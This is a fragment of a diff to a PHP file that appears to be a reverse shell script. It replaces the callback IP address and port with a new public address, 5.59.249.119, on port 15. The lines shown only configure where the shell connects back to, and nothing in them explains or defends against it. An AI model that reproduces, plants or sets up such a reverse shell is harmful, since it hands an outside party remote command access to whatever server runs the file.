@@ -2,8 +2,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '193.32.162.212';  // CHANGE THIS
-$port = 80;       // CHANGE THIS
+$ip = '5.59.249.119';  // CHANGE THIS
+$port = 15;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
